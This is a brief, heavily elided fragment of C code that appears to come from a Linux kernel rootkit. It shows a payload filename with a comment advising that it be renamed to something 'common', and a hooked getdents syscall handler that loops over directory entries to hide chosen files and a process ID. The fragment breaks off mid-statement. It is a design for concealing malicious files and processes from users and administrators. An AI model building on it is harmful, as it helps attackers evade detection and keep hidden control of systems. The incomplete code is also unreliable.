...
char payload[]="payload_example.py"; //Rename to something 'common'
...
asmlinkage int gedent_hook(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
    ...
    while(remaining_bytes > 0){
        ...
        //checks if current file struct contains one of the files to be hidden (including the process id)
        if(
